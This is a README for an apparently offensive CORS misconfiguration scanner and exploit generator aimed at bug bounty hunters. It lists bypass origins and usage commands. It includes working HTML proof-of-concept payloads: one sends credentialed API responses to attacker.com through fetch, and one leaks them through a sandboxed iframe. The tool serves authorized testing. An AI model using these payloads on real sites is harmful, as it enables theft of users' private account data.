# CORS Exploiter

> Automated CORS misconfiguration scanner with PoC exploit generator. Built for bug bounty hunters and penetration testers.

Detects all major CORS bypass techniques, generates ready-to-submit PoC HTML exploit files, and produces bug bounty-ready Markdown reports.

---

## Features

- **10+ bypass techniques** tested per URL
- **PoC generator** — drop-in HTML exploits with exfiltration
- **Multi-URL scanning** — parallelized, file input supported
- **Endpoint discovery** — auto-probes 20+ common API paths
- **Report generator** — HackerOne/Bugcrowd-ready Markdown + JSON
- **Zero dependencies** — pure Python stdlib (no pip install needed)

---

## Installation

```bash
git clone https://github.com/yourhandle/cors-exploiter
cd cors-exploiter
python3 cors_exploit.py --help
```

No pip install required. Pure Python 3.6+.

---

## Usage

### Basic scan
```bash
python3 cors_exploit.py -u https://target.com/api/user
```

### Authenticated scan (with session cookie)
```bash
python3 cors_exploit.py -u https://target.com/api/me -c "session=abc123; auth=xyz"
```

### Scan + auto-discover endpoints + generate PoCs
```bash
python3 cors_exploit.py -u https://target.com -c "session=abc123" --discover --poc --poc-dir ./my_pocs
```

### Custom attacker domain
```bash
python3 cors_exploit.py -u https://target.com/api/user -a "my-evil-server.com"
```

### Custom exfil URL in PoCs
```bash
python3 cors_exploit.py -u https://target.com/api/user --poc --exfil "https://your.burpcollaborator.net"
```

### Scan multiple URLs from file
```bash
python3 cors_exploit.py -f endpoints.txt -c "session=abc123" --threads 10
```

### Full workflow: scan + PoCs + report
```bash
python3 cors_exploit.py -u https://target.com \
  -c "session=abc123" \
  --discover \
  --poc --exfil "https://burpcollaborator.net/cors" \
  --report \
  -o findings.json
```

---

## Bypass Techniques Tested

| # | Technique | Origin Sent | Why It Works |
|---|-----------|-------------|--------------|
| 1 | Arbitrary Origin Reflection | `https://evil.com` | Server reflects any origin |
| 2 | Null Origin | `null` | Accepted from sandboxed iframes |
| 3 | Prefix Match | `https://target.com.evil.com` | Weak `endsWith` check |
| 4 | Suffix Match | `https://eviltarget.com` | Weak `startsWith` check |
| 5 | Subdomain Wildcard | `https://sub.target.com` | `*.target.com` — needs subdomain takeover |
| 6 | HTTP Downgrade | `http://target.com` | Scheme not validated |
| 7 | Trusted Subdomains | `https://dev.target.com` | Dev/staging/test accepted |
| 8 | Special Characters | `https://target.com%60.evil.com` | Parser confusion |
| 9 | Port Variation | `https://target.com:8080` | Port not validated |
| 10 | Uppercase Host | `https://TARGET.COM` | Case-insensitive match |

---

## PoC Exploit Types

### Standard XHR (most common)
```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "https://target.com/api/user", true);
  xhr.withCredentials = true;
  xhr.onload = function() {
    fetch("https://attacker.com/collect?d=" + encodeURIComponent(xhr.responseText));
  };
  xhr.send();
</script>
```

### Null Origin (sandboxed iframe)
```html
<iframe sandbox="allow-scripts" srcdoc="<script>
  var x = new XMLHttpRequest();
  x.open('GET','https://target.com/api/user',true);
  x.withCredentials=true;
  x.onload=()=>parent.postMessage({body:x.responseText},'*');
  x.send();
<\/script>"></iframe>
```

---

## Real-World Bug Bounty Flow

```
1. Find JWT/session cookie in browser
2. Run: python3 cors_exploit.py -u TARGET/api/me -c "SESSION_COOKIE" --discover
3. For each VULN finding: python3 cors_exploit.py -u VULN_URL --poc --exfil COLLAB_URL
4. Host PoC: python3 -m http.server 8080 --directory ./pocs
5. Generate report: --report
6. Submit to H1/Bugcrowd
```

---

## Sample Report Output

```
## Finding #1 — Critical — Reflected

| Field | Value |
|-------|-------|
| URL | https://target.com/api/user |
| Severity | Critical |
| ACAO Response | https://evil.com |
| ACAC Response | true |
```

---

## License

MIT — For authorized testing only.
